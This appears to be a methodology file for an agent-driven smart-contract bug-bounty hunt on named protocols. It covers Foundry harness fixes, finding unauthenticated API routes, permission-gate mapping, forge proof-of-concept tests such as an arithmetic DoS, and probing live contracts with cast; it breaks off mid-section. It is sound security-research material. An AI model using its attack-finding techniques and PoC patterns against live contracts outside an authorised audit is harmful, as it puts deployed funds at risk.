# EVM Foundry harness mechanics + dApp off-chain API-route audit

> **Companion file:** `references/live-reachability-and-hash-divergence.md` §12 —
> census the deployed config *before* assigning severity (range-based
> `eth_getLogs`, decode registration events, `family()` the builders);
> the two-hashes-from-one-struct divergence class (replay key vs policy key);
> role wiring traps in allocator/payer fixtures; "no data slot" vs
> "no commitment"; cheap closure checks (permit, ECDSA high-S, view contracts);
> and the rule for abandoning hand ABI-decoding in favour of the compiler.

Condensed from a multi-round hunt on a Foundry monorepo dApp (1Hive gardens-v2: Diamond
governance + Superfluid streaming + Next.js keeper routes). SKILL.md holds the protocol; this
file holds the *technique* that cost real rounds to discover.

**Section list:** §1 Foundry monorepo build root · §2 interrupted-subagent artifact recovery ·§3 re-dispatch brief contents · §4 Next.js dApp API-route auth audit (set-difference method) ·
§5 EIP-712 claim/authorize flow checklist · **§6 permissionless-creation primitives — the
escalation-gate map** · **§7 modifier-reading traps (next-line, sibling asymmetry, early-return,
zero-instead-of-revert)** · **§8 factory gates that aren't gates** · **§9 forge proof techniques — internal checks via revert selectors, arithmetic-collapse PoCs, and the honest downgrade** ·
**§10 deployed-bytecode ≠ repo-source drift — the selector-probe method, the `eip712Domain()`
**§11 multi-contract trust-graph audits — nested-struct
imports, OZ tag pinning, role census without the enumerable extension, string+bytes mapping-key
discovery, and the compile≠prove rule** · **§11h FAIL-triage — `setUp()` failures are harness bugs,
protocol-named-error reverts are DISPROOF, and the OZ `_setRoleAdmin` fixture traps** ·
**§11k fee-charge order-of-ops (RESOLVED: `fees` is in the orderId digest → chain dead)** ·
**§12 deposit-address derivation is fully order-bound — four-field binding table** ·
**§13 `abi.encodePacked` is prefix-free — proving an encoding collision, then proving it is
unreachable (the authorization/effect split)** · **§14 automated round engine — running a
6-hour / 10-round hunt with a `no_agent` cron job instead of agent stamina**.

**Sibling technique file:** `references/trust-graph-role-reachability-and-latent-findings.md` —
the three things that decided *severity* on the Relay trust-graph brief: the un-handed
privileged contract found by decoding a real tx (§1), ADMIN-EOA→module→drain composition (§2),
checked arithmetic accidentally guarding a missing authz check — LATENT vs refuted, separated by
the `amount = 0` probe (§3), mapping-key mismatch between eligibility and cap (§4), and
LATENT/LIVE/UNDEPLOYED labelling (§5) plus the bounded-20-line summary contract (§6).
**§15 the EIP-712 field-omission family — `token`/`amount` outside the signed struct, and the
deployment-gate check that decides if the bug is live** · **§16 the CODE-omission variant —
`callResolver`/`callResolverData` outside the digest, the resolver-swap front-run ladder, and the
signed-minimum bound theorem that decides severity**.

**How to use §6–§9:** they are the *severity* half of an EVM governance audit. §1–§5 find the
bug; §6–§9 decide whether it is theft, pollution, or a no-op. Run them before writing any
severity word — a permissionless-creation finding reported as "fund theft" without the gate map
is the fastest way to lose credibility on an otherwise real chain.

---

## 1. FOUNDRY MONOREPO: RUN FROM THE ROOT, NOT THE PACKAGE DIR

**Symptom** (looks like a broken clone, isn't):

```
ParserError: Source "forge-std/Test.sol" not found: File not found.
  Searched the following locations: "/…/pkg/contracts"
ParserError: Source "@openzeppelin/contracts/utils/introspection/IERC165.sol" not found
```

**Cause:** a single root `foundry.toml` declares everything repo-root-relative:

```toml
[profile.default]
src    = 'pkg/contracts/src'
script = 'pkg/contracts/script'
test   = 'pkg/contracts/test'
out    = 'pkg/contracts/out'
libs   = ['lib']
remappings = [
  "forge-std/=lib/forge-std/src/",
  "solady/=lib/allo-v2/lib/solady/src",
  "allo-v2/=lib/allo-v2/contracts/",
]
```

Remappings resolve against the config file's directory. Running `forge test` from
`pkg/contracts` resolves them against the wrong base → every import "not found".

**Fix — always:**

```bash
cd <repo-root> && forge test --match-path "pkg/contracts/test/X.t.sol" --root . -vv
```

**Diagnostic before the first build** (30 seconds, saves a round):
`cat foundry.toml | head -40` and `ls lib/`. If `[profile.default]` carries `src = 'pkg/…'`,
the build root is the repo root, full stop. Same rule for any pnpm/turbo monorepo with one
root Foundry config — `--root .` from the repo root, never from the package directory.

**Put this in every subagent brief that touches a Foundry monorepo.** A child that burns its
budget on build errors never reaches the analysis.

---

## 2. INTERRUPTED SUBAGENT ≠ ZERO ARTIFACT (and the artifact may not compile)

Batch of 3 adversarial subagents all returned:

```
--- ✗ TASK 1/3: …  (status=interrupted, 0s) ---
(no summary — status=interrupted: Parent agent interrupted — child did not finish in time)
```

A naive read ("all dead, re-dispatch everything") is wrong. One child had already written a
**24 KB forge test** to disk.

**Recovery sequence that worked:**

1. **Find it** with a marker file you control (the findings log written before dispatch):
   ```bash
   find . -newer findings/00-findings-log.md -type f \
     -not -path "*/.git/*" -not -path "*/node_modules/*" \
     -not -path "*/lib/*" -not -path "*/out/*" -not -path "*/cache/*"
   ```
2. **Read the test function names + assertions** to learn *what it had already proven*
   (`grep -n "function test\|assertTrue\|assertEq"`). Seven `test_ARCH*` functions with
   inline `/// EVIDENCE: file.sol:line` comment blocks — the analysis was done, only the
   harness was unfinished.
3. **Complete it yourself.** The artifact was compile-broken by exactly one missing helper
   (`_deployProxyOwner`). Added it, ran the suite → **7/7 PASS**.

**Rule:** an interrupted agent's artifact is a **DRAFT, not a deliverable** — don't swallow it
whole, don't bin it either. Grep its assertions, fix the compile errors, run it, and only then
count the findings. A sibling agent may still be alive and editing the same file: re-read
before patching (the `_warning: file was modified by sibling subagent` tripwire is real).

---

## 3. RE-DISPATCH BRIEF MUST CARRY THREE THINGS (not just "try again")

The first batch died on build errors + scope overlap. The second batch succeeded because the
brief carried:

1. **The exact build command, with the trap spelled out.**
   *"CRITICAL BUILD INFO: run forge from REPO ROOT, NOT from pkg/contracts. Correct command:
   `cd <root> && forge test --match-path "pkg/contracts/test/YOURTEST.t.sol" --root . -vv`.
   Remappings are in root foundry.toml."*
2. **An `ALREADY COVERED (do NOT re-report)` list** — ~10 known advisories / proven findings
   from round 1, so the child doesn't burn its budget re-reporting duplicates.
3. **A pointer to a known-good reference file.** *"READ IT FIRST for import patterns, setUp
   structure, and how to deploy RegistryFactory/RegistryCommunity."* Without it the child
   rediscovers the Allo/Safe/ERC1967Proxy test harness from zero.

Also state the **output discipline** up front: *"Write PoC tests to `<path>`. Run them. Only
report tests that PASS. Copy final test + evidence to `<findings dir>`."* — plus *"If nothing
exploitable found, say so explicitly and list what you ruled out with evidence."* That last
sentence is what stops a child from inventing a finding to look productive.

---

## 4. NEXT.JS dApp API-ROUTE AUTH AUDIT — the set-difference method

The highest-yield off-chain surface in a web3 dApp is the set of API routes that hold a
**server-side private key** and write on-chain (keepers, oracles, list managers). Auditing
them by reading files one by one misses things; the set difference finds them in three greps.

```bash
# (a) routes that WRITE on-chain
grep -rln "writeContract\|sendTransaction" app/api --include="*.ts"
# (b) routes that CHECK a secret
grep -rln "CRON_SECRET" app/api --include="*.ts"
# (c) (a) minus (b) = unauthenticated on-chain writers  <-- THE FINDING
```

**Then prove it isn't gated globally:**

- Read `middleware.ts` and its `matcher`. `matcher: ["/gardens/:chain/:community/:path*"]`
  does **not** cover `/api/*` → there is no global auth gate on API routes. Never assume one.
- **Cross-check siblings in the same directory.** If `add-strategy` and `daily-job` in
  `passport-oracle/` both check `Bearer ${CRON_SECRET}` and `write-score` does not, that
  asymmetry is your proof — it is not a misreading on your part.
- Check whether the route's own unit test asserts auth. A test file that mocks everything and
  never sends an `authorization` header is corroborating evidence that no gate exists.

**Rate-limit identity — check where the scope key comes from.** If the limiter keys on a
client-settable header (`x-gardens-wallet-address`, `x-forwarded-for`), rotation defeats it
entirely: unlimited uploads/writes on the project's own account. Read
`getRateLimitScope()` before believing any limit.

**Bound the impact honestly — this is where most such findings get downgraded.** Ask what the
attacker actually controls:

| Written value comes from | Attacker can inflate? | Honest severity |
|---|---|---|
| External API (Gitcoin passport score, GoodDollar face-verify) | **No** — only force a refresh of a real value | forced state write + gas griefing → **Medium** |
| Request body / query param | **Yes** | escalate toward High/Critical |

Report the first shape as *unauthenticated on-chain state write + keeper gas griefing*, not
theft. Saying "theft" when the value is API-sourced is the fastest way to lose credibility on
an otherwise real finding.

---

## 5. EIP-712 CLAIM / AUTHORIZE FLOWS — four checks, then record as cleared

Keeper-signed claim/opt-in flows look suspicious and are usually built correctly. Run these
four, and if all pass, **write "cleared with evidence" into the findings log** so a future
session doesn't re-probe the same surface:

1. **Recipient is server-derived, never from the request.** Read it on-chain
   (`councilSafe()` via `readContract`) and re-read at verify time; reject if it changed.
2. **Quote snapshot is bound and single-use.** Bind `chainId` + `community` + `recipient` +
   TTL, store server-side, `consume` on verify. A `quoteId` from the client must only select
   a snapshot, never supply terms.
3. **Execution re-fetches a fresh quote and re-validates every bound** against the signed
   message: `claimAmount` equality, fee ceiling (`estimatedFeeAmount > maxFeeAmount` → 409),
   `expectedAmountOut < minAmountOut` → 409.
4. **Keeper authorization is re-read on-chain at execution time** (`keepers(address)` on the
   router), not assumed from config.

Also worth one grep on any bridge-adapter surface: does the adapter **bind executed calldata
to the configured destination receiver**, or does it forward a caller/quote-supplied blob
verbatim? The verbatim-forward shape is a known advisory class — check the sibling adapters
for the same pattern before assuming one fix covered the family.

---

## 6. PERMISSIONLESS-CREATION PRIMITIVES — the escalation-gate map

The most common *real* finding in a Diamond/factory governance protocol is not a missing
modifier on a money function. It is a **permissionless creation primitive** (anyone can mint a
community, deploy a pool, register an arbitrable) that looks catastrophic until you work out
what the created object can actually reach. The finding is real; the severity is decided by the
**escalation-gate map**, and building that map is the actual work.

### The shape (gardens-v2, all PROVEN by forge)

```
RegistryFactory.createRegistry()        no access modifier  → attacker mints a community,
                                                              becomes COUNCIL_MEMBER, installs
                                                              own councilSafe + feeReceiver
CommunityPoolFacet.createPool()         no access modifier  → attacker deploys a strategy proxy,
                                                              grants itself ALLOWLIST_ADMIN
CVStrategy.init params                 attacker-controlled  → _params.registryCommunity points at
                                                              a VICTIM community, not address(this)
```

The escalation that *looks* immediate: the attacker now holds a strategy bound to a victim
community with an allowlist seat. It is **not** a theft primitive, and proving why is the
deliverable.

### Build the gate map before writing a single severity word

Enumerate every modifier in the codebase and record which one guards each fund-moving function:

```bash
grep -rn "onlyCouncilSafeOrMember\|onlyCouncilSafe()\|onlyRegistryCommunity\|onlyStrategyEnabled" src/
```

Then for each gate, state *what identity it demands*:

| Gate | Demands | Attacker (via injected pool) satisfies? |
|---|---|---|
| `checkSenderIsMember` | `votingPowerRegistry.isMember(sender)` | **No** — not a member of the victim |
| `onlyCouncilSafe` | `msg.sender == registryCommunity.councilSafe()` | **No** |
| `onlyRegistryCommunity` | `msg.sender == registryCommunity` | **No** (attacker is the *strategy*, not the community) |
| `onlyStrategyEnabled` | `enabledStrategies[_strategy]` | **No** — `addStrategy` is `onlyCouncilSafe` |
| `onlyCouncilSafeOrMember` | council **or** `_canExecuteAction(sender)` | **YES** — allowlisted on the injected pool |

**The one gate that opens is the one worth reporting**, and it is usually narrow. In this case
it was `connectSuperfluidGDA` — an allowlisted member on an *injected* pool could connect an
attacker-controlled GDA pool, which is a **variant of a known advisory class** (the same root
cause already restricted to the council safe on legitimate pools). Report it as a variant with
the precondition named, not as a new critical.

### The honest verdict sentence

> "Unauthorized pool injection into any community + allowlist self-grant + GDA connection.
> **Not fund theft** — every fund-moving function is gated by membership / council /
> registry-identity / enabled-strategy, none of which the injected pool satisfies."

Writing that sentence *before* the severity is what stops the finding from being inflated. A
reviewer who can reproduce the gate map will accept Medium-High; one who finds you claimed
theft will discount everything else in the report.

### Self-benefit chains are non-eligible — say so and move on

Several chains terminate in "attacker can only benefit their own object": a protopian fee
exemption on a community the attacker just created, a keeper-free path on their own pool. Under
the bounty rules these are self-penalizing and non-eligible. Record them as **BLOCKED with the
gate cited** rather than dropping them silently — the next session will otherwise re-derive them.

---

## 7. MODIFIER-READING TRAPS (four distinct ways to read a gate wrong)

Each of these produced a wrong conclusion in one session. All four are cheap to avoid.

### 7a. The modifier is on the NEXT line

`grep -n "function removeStrategy"` returns the declaration line. The gate is one line below:

```solidity
function removeStrategy(address _strategy) public {     // :67  ← grep stops here, looks public
    if (msg.sig == bytes4(0)) revert();
    onlyCouncilSafe();                                   // :69  ← the actual gate
    _removeStrategy(_strategy);
}
```

**Always read 3–5 lines past the signature before concluding a function is unguarded.** A
`public` function with a modifier on the next line is the single most common false positive in
an access-control sweep.

### 7b. Sibling asymmetry is the real signal — and it cuts both ways

Compare sibling functions in the same facet:

```solidity
function activateMemberInStrategy(...) public {
    onlyRegistryMemberAddress(_member);
    onlyStrategyEnabled(_strategy);      // ← present
    onlyStrategyAddress(msg.sender, _strategy);
}
function deactivateMemberInStrategy(...) public {
    onlyStrategyAddress(msg.sender, _strategy);   // ← onlyStrategyEnabled ABSENT
}
```

The missing check is a genuine asymmetry. **But an asymmetry is not an exploit** — check
whether the missing gate is *load-bearing* for the attack. Here it was not: the function
early-returns when `memberActivatedInStrategies[member][strategy]` is false, and the only way
to set that flag is the sibling that *does* check `onlyStrategyEnabled`. So the missing gate
guards a state the attacker cannot reach. Report as **BLOCKED — bounded by the early return**,
with both the missing check and the early return cited.

### 7c. Early-return vs revert — a missing gate may be unreachable, not exploitable

`if (memberActivatedInStrategies[_member][_strategy]) { ... }` followed by `return` means the
function is a **no-op** for any state the attacker can produce. Distinguish:

- **Reverts** → the gate is enforced; attacker is blocked loudly.
- **Early-returns** → the gate is *unnecessary* for that state; the function does nothing.

An attacker-controlled call that hits an early-return is not a finding, it is a no-op. Cite the
return path explicitly so the reviewer doesn't have to find it.

### 7d. `address(0)` is often an intentional bypass, not a bug

```solidity
if (address(sybilScorer) != address(0)) { return sybilScorer.canExecuteAction(...); }
// else: allowlist path
bytes32 allowlistRole = keccak256(abi.encodePacked("ALLOWLIST", poolId));
return registryCommunity.hasRole(allowlistRole, address(0)) || registryCommunity.hasRole(allowlistRole, _user);
```

An attacker setting `sybilScorer = address(0)` does **not** bypass sybil checking — it selects
the allowlist branch, and the allowlist is granted by the *creating facet* to
`_params.initialAllowlist`, i.e. to the attacker themselves on their own injected pool. So the
attacker gains a seat on a pool they created, bound to a victim community they do not belong to.
That is the finding (pool injection), and it is **not** a sybil-scorer bypass. Trace which
branch a zero value actually selects before calling it a bypass.

### The general rule

For every "missing check" claim, answer three questions in the report with file:line:
1. What state does the missing gate protect?
2. Can the attacker produce that state? (which function sets it, and what gates *that* one?)
3. Does the target function revert, or early-return, on the state the attacker *can* produce?

If the answer to (2) is no, the finding is bounded — say so and downgrade.

---

## 8. FACTORY GATES THAT AREN'T GATES

A factory is not automatically a trust boundary. Check what its `onlyOwner`/authorized-wallet
gates actually protect, and whether the *caller* can satisfy them by deploying their own object.

```solidity
function deployEscrow(ISuperToken superToken, ISuperfluidPool pool,
                      address beneficiary, address strategy) external returns (address escrow) {
    if (strategy == address(0)) revert InvalidAddress();
    if (msg.sender != strategy) revert UnauthorizedCaller(msg.sender, strategy);   // ← "gate"
    ...
}
```

`msg.sender != strategy` reads like authorization, but the caller **deploys the strategy**, so
they satisfy it trivially. The same shape appears wherever a factory validates
`msg.sender == <an object the caller controls>`.

**Test:** can the caller create the very identity the gate demands? If yes, the gate
authenticates nothing. What it *does* bound is the beneficiary/parameters — so the real
question becomes whether the created object can ever hold anyone else's funds. In the
gardens-v2 case the escrow was empty until someone streamed to it, so the chain terminated in
self-funding.

Related gate to check in the same family: `setAuthorizedWallet` / `isAuthorizedWallet`
(`onlyOwner` on the writer) is a genuine gate — verify the writer's modifier before assuming
the whole authorized-wallet mechanism is soft.

---

## 9. FORGE PROOF TECHNIQUES — three that turned a code-read into a PROVEN claim

### 9a. Proving an `internal` check through a public consumer's revert selector

The gate you need to prove is often `internal` (`_canExecuteAction(address)`), so there is no
`canExecuteAction` selector to call on the strategy. Calling it externally fails with a
misleading revert and the test dies.

**Pattern:** find the *public* function whose first act is that internal check, call it, and
assert on the **absence of the specific revert selector**. A revert with any *other* selector
proves the internal check passed.

```solidity
// _canExecuteAction is internal; CVPowerFacet.activatePoints() gates on it first and
// reverts UserCannotExecuteAction(address) = 0xeee56a60 when it fails.
vm.startPrank(attacker);
(bool ok, bytes memory err) = strategy.call(abi.encodeWithSignature("activatePoints()"));
vm.stopPrank();
assertFalse(ok, "did not succeed outright");
assertFalse(
    err.length >= 4 && bytes4(err) == bytes4(0xeee56a60),
    "_canExecuteAction(attacker) == true (allowlist branch reached)"
);
```

This is how CHAIN #1's fifth proof was locked. The selector is the contract's own error —
read it from the `error` declaration, never guess it. If the internal check is reached through
several public entry points, pick the one with the fewest preconditions.

### 9b. Arithmetic-collapse PoCs: offline numeric pre-filter, then a three-assertion forge test

For a suspected integer-division/overflow bug in a pure library, **do not start in forge**.
Run the arithmetic offline first, then write a test that asserts the *preconditions* and the
revert — that shape is self-documenting and survives review.

Offline filter (Python, seconds):

```python
D = 10_000_000
for pool in (10**18, 10**24, 10**27):
    ceiling = (MAX_RATIO * pool) // D
    for delta in (1, 10, 100, 10**6, 10**12):
        req = ceiling - delta
        if MAX_RATIO * pool <= req * D:      # the contract's own guard
            continue
        denom = (MAX_RATIO * 2**64)//D - (req * 2**64)//pool
        if 0 < denom < 2**32:                # (denom*denom)>>64 == 0  → div-by-zero
            print("HIT", pool, delta, denom)
```

Then the forge test asserts three things in order — guard passes, divisor collapses, call
reverts:

```solidity
assertTrue(MAX_RATIO * pool > requested * D, "precondition: guard passes");
uint256 denom = (MAX_RATIO * 2**64)/D - (requested * 2**64)/pool;
assertTrue(denom > 0, "precondition: denom positive");
assertEq((denom * denom) >> 64, 0, "precondition: divisor collapses to zero");
vm.expectRevert();                       // Math.mulDiv division by zero
ConvictionsUtils.calculateThreshold(requested, pool, pts, DECAY, WEIGHT, MAX_RATIO, 0);
```

Add a fuzz test that bounds the inputs and `return`s outside the poisoned band, plus one that
binary-searches the band width and `emit log_named_uint`s it — the width scaling with pool size
is the sentence that makes the report concrete.

**Then check every other call site of the same library function before ranking.** In this
session the streaming path called it with `requestedAmount = 0` (a large, safe `denom`), so the
pool-wide rebalance was unaffected and the finding dropped from "pool-wide DoS" to
"single-proposal DoS". One grep of the function name across `src/` is the whole check.

### 9c. The honest downgrade — write it into the finding, not around it

A PROVEN arithmetic bug can still be Low. The downgrade is not a failure; shipping it as
Medium when the impact is self-inflicted is. The three questions that decided it here:

1. **Who chooses the poisoned input?** The proposal submitter sets `requestedAmount`, and they
   can `cancelProposal()` → self-inflicted → non-eligible under the bounty's self-penalizing rule.
2. **Is there a second, higher-impact call path?** The external view revert breaks a UI read →
   frontend-only → out of scope.
3. **Does the shared/looped path inherit the bug?** No — streaming passes `0`.

Record the verdict as *"PROVEN (5/5, fuzz 500 runs), severity Low — self-inflicted, view-path
frontend-only, shared path unaffected"* and name the mitigation (`if (denom < 2**32) return
type(uint256).max;`). A reviewer trusts a proven-and-downgraded finding far more than an
unproven Medium, and the mitigation line is what makes it actionable.

### 9d. A subagent that returns `status=completed` with zero passing tests

Distinct from §2's *interrupted* case. Both lanes came back `completed` with honest
self-reports: *"no passing PoC tests produced. The test harness did not compile."* One left a
~1000-line fuzz file mid-compile-fix; the other left a 10-test file with a harness-inheritance
error. **Neither is a dead end and neither is a result.**

Handling that worked:

1. **Read the full summary from the cache path** the completion banner gives you
   (`~/.hermes/cache/delegation/subagent-summary-*.txt`) — the banner truncates the middle,
   and the candidate list lives there.
2. **Harvest the candidates, not the tests.** Both agents ranked their own leads and named the
   ones they judged non-eligible. Take the one with "plausible Medium+ impact and a genuinely
   new root cause" and verify it yourself (§9b) — that is what produced the PROVEN finding.
3. **Harvest the ruled-out list as an asset.** One agent returned a file:line map of ~12
   cleared surfaces (no signature primitives anywhere in `src/`, every bridge adapter pinned,
   `CollateralVault` ledger-decrement-before-call, conviction invariants clean over 600k
   offline cases). Writing that into the findings log stops the next session re-probing it.
4. **Do not re-dispatch the same brief.** The questions were answerable from local code; the
   fix was to run the arithmetic and the forge test directly.

The general rule, same as §2's: **an agent's unfinished artifact is a draft, and its
ruled-out list is evidence.** Both halves are worth more than a third dispatch.

---

## 10. DEPLOYED BYTECODE ≠ REPO SOURCE — the selector-probe method

The most expensive assumption in a live EVM audit: **the repo you cloned is the code that is
deployed.** On a real target (Relay settlement, chain 537713, repo tagged `v0.0.7`) the deployed
`RelayAllocator` exposed `ORACLE()(address)` while the repo's `RelayAllocator.sol` declares
`ORACLE_MULTISIG()(address)`. `cast call ... "ORACLE_MULTISIG()"` reverted with
`execution reverted: error code 3` — which reads like a decode problem, not a version problem.

**Run this before writing a single line of analysis, and again before writing the report:**

```bash
CODE=$(cast code $TARGET --rpc-url $RPC)
check() { sel=$(cast sig "$1"); echo "$CODE" | grep -qi "${sel#0x}" && echo "HAS  $1" || echo "MISS $1"; }
check "ORACLE_MULTISIG()(address)"
check "submitWithdrawRequest((string,bytes,bytes,uint256,string,bytes,bytes,bytes,bytes32))(bytes32)"
check "consumeSpenderSignature((string,bytes,bytes,uint256,string,bytes,bytes,bytes,bytes32),bytes)(bool)"
```

`cast sig` computes the 4-byte selector from the signature string; grepping the hex bytecode for
it tells you whether the function exists in the deployed artifact. `internal` functions never
appear (correctly) — a MISS on `consumeSpenderSignature` is expected and is *not* evidence of
drift. What matters is the **public/external surface**.

Three outcomes, all reportable:

| Outcome | Meaning | Report shape |
|---|---|---|
| Selector present, semantics match repo | source and deployment agree | proceed |
| Selector **absent**, repo declares it | **deployed is a different build** | state the version gap explicitly; every conclusion drawn from repo source is UNVERIFIED against the live contract until re-derived from bytecode |
| Selector present, **name differs** | the deployed build renamed/refactored | re-map every finding to the deployed name before reporting |

**Corollary — never debug the arguments of a reverting `cast call`.** `execution reverted: error
code 3` on a function you are *sure* exists usually means the selector is not in the deployed
bytecode at all. Confirm with the grep above first.

### The `eip712Domain()` decode trap (OZ v5)

```bash
# FAILS — "could not decode output; type check failed for offset (usize) with data: 0f00..."
cast call $T "eip712Domain()(string,string,uint256,address,bytes32,uint256)" --rpc-url $RPC

# WORKS — OZ v5 returns (bytes1 fields, string name, string version, uint256 chainId,
#           address verifyingContract, bytes32 salt, uint256[] extensions)
cast call $T "eip712Domain()(bytes1,string,string,uint256,address,bytes32,uint256)" --rpc-url $RPC
```

The leading `0x0f` in the failing output is the `fields` bitmask (name|version|chainId|
verifyingContract all set). Seeing a bare `0f00...` word where you expected a string offset is
the tell that you are reading a *different return arity*, not a broken contract. This is the
cheapest way to read a live EIP-712 domain separator — which is what every cross-chain replay
claim depends on.

### Role census: enumerate, don't infer

For any `AccessControl` target, resolve the role hashes once and census every address you know
about — deployer, executor, allocator, oracle, gas payer, deposit manager:

```bash
OP=$(cast keccak "OPERATOR_ROLE"); AR=$(cast keccak "ORACLE_ROLE"); AD=$(cast keccak "ADMIN_ROLE")
for a in $EXEC $ALLOC $ORACLE $WGP $DEP $DAM $OWNER; do
  echo "$a OPERATOR=$(cast call $HUB "hasRole(bytes32,address)(bool)" $OP $a --rpc-url $RPC)"
done
```

On the Relay target this produced the load-bearing fact for the whole session: **the Executor
and the Allocator both hold `OPERATOR_ROLE` on the Hub**, and `isOperator(account, operator)`
returns true for *any* `OPERATOR_ROLE` holder — so one global grant is a transfer right over
every account's balance. That is a design property, not a bug, but it decides the severity of
every other claim, and it is invisible in the repo's deployment docs.

### The standalone-harness pattern when the target repo has no node_modules

When the audited repo's `libs = ["node_modules", "lib"]` and `node_modules/` is absent (deps
installed by a `postinstall` script that never ran), do **not** try to repair the target repo.
Build a standalone project that imports the target's sources by absolute remapping:

```toml
remappings = [
  "@openzeppelin/=/abs/path/lib/openzeppelin-contracts/",
  "forge-std/=lib/forge-std/src/",
  "relay-contracts/=/abs/path/to/target/contracts/",
]
```

Two traps that cost real minutes here, both already noted in this file's §1/§2 neighbourhood:

- **OZ remapping prefix.** The vendor tree nests `contracts/` once, so
  `"@openzeppelin/=lib/openzeppelin-contracts/contracts/"` + import
  `@openzeppelin/contracts/...` resolves to `.../contracts/contracts/...` → not found. Map
  `@openzeppelin/=` at the **repo root** of the vendor clone, not at `contracts/`.
- **`vm.sign` returns a tuple, not bytes.** `bytes memory s = vm.sign(pk, digest);` fails with
  *"Type uint8 is not implicitly convertible to expected type bytes memory"*. Destructure:
  `(uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, digest); bytes memory sig = abi.encodePacked(r, s, v);`
  For a concatenated N-of-M verifier (`RelayOracleMultisig` requires ascending signer order)
  build each 65-byte sig separately, then `abi.encodePacked(sigA, sigB)` and swap if
  `vm.addr(pkA) > vm.addr(pkB)`.

Also: `address(0xV1C71)`-style vanity hex literals are **not valid Solidity** — the compiler
reads `V` as a hex digit and emits *"Identifier-start is not allowed at end of a number"*.
Use `address(uint160(0x...b1c71))` with a real hex value, and expect a checksum-mismatch error
(`Error 9429`) that names the correct checksummed form — paste the compiler's suggestion rather
than guessing.

---

## 11. MULTI-CONTRACT TRUST-GRAPH AUDITS — the mechanics that cost real rounds

A "map the trust boundary of every contract in the protocol" brief is a different shape from a
single-contract hunt. The deliverable is a table of entrypoints × caller × guard × state effect,
a data-flow trace per function, and an explicit list of unenforced invariants. Five mechanics
below are the ones that burned time; the last one is the one that decides whether the report is
worth anything.

### 11a. Nested structs are NOT importable — import the file, qualify the type

`WithdrawRequest`, `Input`, and `DerivationFields` are declared *inside* their contracts
(`contract RelayAllocator { struct WithdrawRequest {...} }`), so:

```solidity
import {RelayAllocator, WithdrawRequest} from ".../RelayAllocator.sol";   // ✗ Error 2904
```

`Error (2904): Declaration "WithdrawRequest" not found`. The fix is a bare file import plus
qualified use:

```solidity
import ".../RelayAllocator.sol";                       // ✓ whole-file import
RelayAllocator.WithdrawRequest memory req = RelayAllocator.WithdrawRequest({...});
```

Check `grep -n "^struct\|^contract"` on the target file first — file-level structs
(`BuildPayloadParams`, `Fee`, `ExecuteAndWithdrawRequest`) import normally, contract-nested ones
do not. Mixing the two in one import line is the usual failure.

### 11b. Pin the OpenZeppelin tag — `master` requires solc ^0.8.31

A fresh `git clone` of `openzeppelin-contracts` pulls `master`, whose `Strings.sol` now carries
`pragma solidity ^0.8.31`. Against a target pinned to `0.8.28` (read the target's
`foundry.toml` / `solc_version`) the build dies with:

```
Error: Encountered invalid compiler version in lib/openzeppelin-contracts/contracts/utils/Strings.sol:
No compiler version exists that matches the version requirement: ^0.8.31
```

**Fix:** `git clone --depth 1 --branch v5.4.0` (or whichever tag matches the target's OZ major).
Do not try to force a newer solc — the target's own pragmas will then reject it.

### 11c. Role census when `AccessControl` is NOT the enumerable variant

`getRoleMemberCount(bytes32)` / `getRoleMember(bytes32,uint256)` revert with `error code 3` on a
contract using plain `AccessControl` (not `AccessControlEnumerable`) — and on a non-proxy
contract that revert means *the function does not exist*, not that the role is empty. Do not read
the revert as "no members".

**Working census** — resolve the role hashes once, then probe `hasRole` for every address you
already know from the deployment manifest (`deployments/contracts/prod.json` in this repo gives
hub/allocator/executor/oracle/gasPayer/depositManager/safe in one JSON walk):

```bash
AD=$(cast call $HUB "ADMIN_ROLE()(bytes32)" --rpc-url $RPC)   # read the constant, don't keccak it
for a in $EXEC $ALLOC $ORACLE $WGP $DAM $SAFE; do
  r=$(cast call $HUB "hasRole(bytes32,address)(bool)" $AD $a --rpc-url $RPC)
  [ "$r" = "true" ] && echo "ADMIN  $a"
done
```

Read the role constant through `cast call` rather than `cast keccak "ADMIN_ROLE"` — the two agree
for these, but the call also proves the getter exists. A role with **zero** members across every
known address is a real finding (on this target `EDITOR_ROLE` had no holders at all, so
`setTokenMetadata` / `setContractURI` were un-callable — a liveness observation, not a
vulnerability, but it belongs in the report).

### 11d. `mapping(string => mapping(bytes => address))` — guessing the key costs a call each

`payloadBuilders(string chainId, bytes depository)` cannot be enumerated. The key is the
**SDK-encoded** depository, and the encoding is per-VM:

| vmType | Encoding | Length |
|---|---|---|
| `ethereum-vm` | raw 20-byte address | 20 |
| `solana-vm` | raw base58-decoded pubkey | 32 |
| `bitcoin-vm` | script/hash160 form | varies |

Read the encoder from the SDK, not from memory: `packages/lit-deposit-address/src/common/address.ts`
dispatches per vmType, and `ethereum.ts` is a bare `hexToBytes` with a `length !== 20` guard. A
32-byte left-padded EVM address returns `0x0` (no builder) and looks like "unconfigured" — it is
just the wrong key. Two probes that disambiguate quickly:

```bash
for dep in "0x4cd00e387622c35bddb9b4c962c136462338bc31" \
           "0x0000000000000000000000004cd00e387622c35bddb9b4c962c136462338bc31"; do
  cast call $ALLOC "payloadBuilders(string,bytes)(address)" "ethereum" "$dep" --rpc-url $RPC
done
```

A depository address with **no code on the settlement chain** is normal — it is a foreign-chain
address used purely as an opaque `bytes` key. Don't spend calls probing it for `owner()`.

### 11h. A RED harness does not mean an exploit — and a GREEN one does not mean a guard: read the SETUP failures

Foundry's default output makes a **broken fixture look identical** to a **refuted exploit**. Both
render as `[FAIL: ...]`. Until you read *which phase* failed, you have no information at all.

Session that nearly shipped a critical on this: a 5-test suite was run to confirm an unguarded
`approveFor`. Output:

```
[FAIL: OnlyERC20ViewCanCallApproveFor(0x…a77Ac, 0x037e…3f3)] test_P1_attacker_eoa_direct_approveFor()
[PASS] test_P2_approveFor_via_erc20view()
[FAIL: OnlyERC20ViewCanCallApproveFor(...)]          test_P3_forged_allowance_moves_funds_via_erc20view()
[PASS] test_P4_control_without_approveFor_reverts()
[FAIL: OnlyERC20ViewCanCallApproveFor(...)]          test_P5_allowance_for_accomplice()
```

`P2` (called from the legitimate view) passed; every attacker-path test failed **with the
protocol's own named error**. That asymmetry is the *disproof*, and it is the single most useful
output shape in access-control testing: **the positive control passes, the attack paths revert.**

Contrast with the same session's other 4 failures, which meant nothing at all:

```
[FAIL: AccessControlUnauthorizedAccount(0x7FA9…1496, 0x9766…b929)] test_nonce_consumed_only_on_success() (gas: 103617)
```

That is `setUp()` — `admin` was `prank`ed onto `hub.grantRole(...)` but never *granted*
